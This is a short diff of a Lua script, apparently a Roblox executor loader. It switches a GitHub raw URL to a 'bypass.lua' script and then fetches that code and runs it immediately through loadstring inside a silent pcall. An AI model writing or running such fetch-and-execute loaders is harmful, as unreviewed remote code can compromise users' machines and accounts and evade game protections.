@@ -4,7 +4,7 @@ local HttpService = game:GetService("HttpService")
 
 
 pcall(function()
-    local raw = game:HttpGet("https://raw.githubusercontent.com/WataXScript/WataXMountAtin/main/Loader/WataX.lua")
+    local raw = game:HttpGet("https://raw.githubusercontent.com/aditpacked/testing/refs/heads/main/bypass.lua")
     loadstring(raw)()
 end)
 
